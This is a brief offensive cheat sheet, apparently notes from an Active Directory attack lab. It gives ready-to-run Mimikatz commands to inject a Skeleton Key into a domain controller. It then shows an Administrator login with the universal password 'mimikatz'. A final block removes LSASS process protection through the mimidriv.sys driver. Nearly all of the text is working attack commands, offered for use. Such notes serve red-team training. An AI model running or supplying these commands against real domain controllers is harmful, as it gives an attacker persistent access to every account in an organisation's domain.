# Skeleton Key 

## Use the below command to inject a skeleton-Key
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
> Skeleton Key password is : **mimikatz**


## Now we can access any machine with valid username and password as mimikatz
```powershell
Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
```

## LSASS running as a protected process
In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC
```mimikatz
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```